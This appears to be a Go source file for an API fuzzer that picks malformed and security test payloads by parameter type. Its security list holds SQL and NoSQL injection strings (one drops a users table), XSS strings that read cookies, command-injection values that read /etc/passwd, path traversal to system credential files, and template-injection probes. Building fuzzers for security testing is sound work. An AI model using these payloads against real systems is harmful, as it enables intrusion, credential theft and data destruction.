package swagger

import (
	"strings"
)

// PayloadCategory groups payloads by their attack/test vector type.
type PayloadCategory struct {
	Name     string   // Category name for reporting
	Severity string   // Default severity if anomaly is found
	Payloads []string // List of payloads in this category
}

// GetPayloadsForType returns type-aware fuzz payloads based on the parameter/field data type.
// This is the "Smart" part — instead of blind fuzzing, we generate payloads
// that are specifically designed to break the expected data type.
func GetPayloadsForType(dataType string, format string) []PayloadCategory {
	var categories []PayloadCategory

	switch dataType {
	case "integer", "number":
		categories = append(categories, integerPayloads()...)
	case "string":
		categories = append(categories, stringPayloads(format)...)
	case "boolean":
		categories = append(categories, booleanPayloads()...)
	case "array":
		categories = append(categories, arrayPayloads()...)
	default:
		categories = append(categories, stringPayloads("")...)
	}

	// Always include security payloads regardless of type
	categories = append(categories, securityPayloads()...)

	return categories
}

// integerPayloads generates payloads designed to break integer/number parameters.
func integerPayloads() []PayloadCategory {
	return []PayloadCategory{
		{
			Name:     "type_confusion",
			Severity: "MEDIUM",
			Payloads: []string{
				"abc",                 // String instead of number
				"true",               // Boolean instead of number
				"null",               // Null value
				"undefined",          // Undefined value
				"[]",                 // Array instead of number
				"{}",                 // Object instead of number
				"1.1.1",              // Malformed decimal
				"0x1A",               // Hex notation
				"1e999",              // Scientific overflow
				"NaN",               // Not a Number
				"Infinity",          // Infinity value
			},
		},
		{
			Name:     "boundary",
			Severity: "MEDIUM",
			Payloads: []string{
				"-1",                  // Negative
				"0",                   // Zero
				"-0",                  // Negative zero
				"-9999999999",         // Large negative
				"2147483647",          // Max Int32
				"2147483648",          // Int32 overflow
				"-2147483648",         // Min Int32
				"-2147483649",         // Int32 underflow
				"9999999999999999999", // Extreme large number
				"0.000000001",         // Very small decimal
				"99999999999999999999999999999999", // Beyond Int64
			},
		},
	}
}

// stringPayloads generates payloads designed to break string parameters,
// with format-awareness (email, uuid, date-time, etc.).
func stringPayloads(format string) []PayloadCategory {
	categories := []PayloadCategory{
		{
			Name:     "boundary",
			Severity: "MEDIUM",
			Payloads: []string{
				"",                          // Empty string
				" ",                         // Whitespace only
				"   \t\n\r  ",              // Mixed whitespace
				strings.Repeat("A", 1000),   // Long string
				strings.Repeat("A", 10000),  // Very long string (buffer overflow check)
				strings.Repeat("🔥", 500),   // Unicode stress test
				"null",                      // String "null"
				"undefined",                 // String "undefined"
				"<empty>",                   // Placeholder-like
			},
		},
		{
			Name:     "type_confusion",
			Severity: "MEDIUM",
			Payloads: []string{
				"0",
				"-1",
				"true",
				"false",
				"[]",
				"{}",
				"[null]",
			},
		},
		{
			Name:     "encoding",
			Severity: "LOW",
			Payloads: []string{
				"<>&\"'",                     // HTML special chars
				"%00",                        // Null byte
				"%0A%0D",                     // CRLF injection
				"\x00\x01\x02",              // Control characters
				"👩‍👩‍👦‍👦🌟",                     // Complex emoji
				"Ñoño",                       // Latin extended
				"日本語テスト",                  // CJK characters
				"مرحبا",                      // RTL text
			},
		},
	}

	// Format-specific payloads
	switch format {
	case "email":
		categories = append(categories, PayloadCategory{
			Name:     "format_violation",
			Severity: "LOW",
			Payloads: []string{
				"not-an-email",
				"@missing-local",
				"missing-domain@",
				"user@.com",
				"user@domain..com",
				strings.Repeat("a", 255) + "@test.com",
			},
		})
	case "uuid":
		categories = append(categories, PayloadCategory{
			Name:     "format_violation",
			Severity: "LOW",
			Payloads: []string{
				"not-a-uuid",
				"12345678-1234-1234-1234-12345678901",  // Too short
				"12345678-1234-1234-1234-1234567890123", // Too long
				"ZZZZZZZZ-ZZZZ-ZZZZ-ZZZZ-ZZZZZZZZZZZZ", // Invalid hex
			},
		})
	case "date-time", "date":
		categories = append(categories, PayloadCategory{
			Name:     "format_violation",
			Severity: "LOW",
			Payloads: []string{
				"not-a-date",
				"9999-99-99",
				"0000-00-00",
				"2025-13-32T25:61:61Z",
			},
		})
	}

	return categories
}

// booleanPayloads generates payloads designed to break boolean parameters.
func booleanPayloads() []PayloadCategory {
	return []PayloadCategory{
		{
			Name:     "type_confusion",
			Severity: "MEDIUM",
			Payloads: []string{
				"0",
				"1",
				"2",
				"-1",
				"yes",
				"no",
				"maybe",
				"null",
				"undefined",
				"\"true\"",
				"\"false\"",
				"[]",
				"{}",
			},
		},
	}
}

// arrayPayloads generates payloads designed to break array parameters.
func arrayPayloads() []PayloadCategory {
	return []PayloadCategory{
		{
			Name:     "type_confusion",
			Severity: "MEDIUM",
			Payloads: []string{
				"not-an-array",
				"{}",
				"null",
				"[" + strings.Repeat("1,", 999) + "1]", // Very long array
				"[[[[[[[[]]]]]]]]",                       // Deeply nested
			},
		},
	}
}

// securityPayloads returns universal security-focused payloads
// that should be tested regardless of expected data type.
func securityPayloads() []PayloadCategory {
	return []PayloadCategory{
		{
			Name:     "sqli",
			Severity: "CRITICAL",
			Payloads: []string{
				"' OR '1'='1",
				"admin' --",
				"' OR 1=1 LIMIT 1 --",
				"1; DROP TABLE users",
				"' UNION SELECT null, null, null--",
				"1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
				"\" OR \"\"=\"",
			},
		},
		{
			Name:     "nosqli",
			Severity: "CRITICAL",
			Payloads: []string{
				`{"$gt": ""}`,
				`{"$ne": null}`,
				`{"$regex": ".*"}`,
			},
		},
		{
			Name:     "xss",
			Severity: "HIGH",
			Payloads: []string{
				"<script>alert(1)</script>",
				"\"><svg/onload=alert(1)>",
				"javascript:alert(1)//",
				"'\"><img src=x onerror=alert(1)>",
				"<img src=x onerror=alert(document.cookie)>",
			},
		},
		{
			Name:     "command_injection",
			Severity: "CRITICAL",
			Payloads: []string{
				"| cat /etc/passwd",
				"& whoami",
				"; ls -la",
				"`id`",
				"$(cat /etc/passwd)",
			},
		},
		{
			Name:     "path_traversal",
			Severity: "HIGH",
			Payloads: []string{
				"../../../etc/passwd",
				"..\\..\\windows\\system32\\config\\sam",
				"....//....//....//etc/passwd",
				"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			},
		},
		{
			Name:     "ssti",
			Severity: "HIGH",
			Payloads: []string{
				"${7*7}",
				"{{7*7}}",
				"<%= 7*7 %>",
				"#{7*7}",
			},
		},
	}
}
